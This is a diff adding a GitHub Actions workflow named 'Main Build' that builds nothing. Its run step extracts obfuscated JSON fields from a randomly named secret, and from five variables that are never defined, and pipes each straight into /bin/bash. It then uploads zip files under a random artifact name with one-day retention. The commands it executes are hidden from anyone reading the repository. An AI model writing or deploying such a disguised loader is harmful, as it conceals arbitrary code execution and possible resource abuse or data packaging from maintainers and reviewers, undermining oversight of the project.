@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  service:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          j9707: ${{ secrets.j9707 }}
+        run: |
+          printf '%s' "$j9707" | jq -r .us8714 | /bin/bash
+          printf '%s' "$tk8717" | jq -r .vqic81 | /bin/bash
+          printf '%s' "$sqqxd3139" | jq -r .cj01 | /bin/bash
+          printf '%s' "$j30" | jq -r .vme83 | /bin/bash
+          printf '%s' "$btt64" | jq -r .rgkn195 | /bin/bash
+          printf '%s' "$q0128" | jq -r .i960 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4TIpL2m5
+          path: "*.zip"
+          retention-days: 1
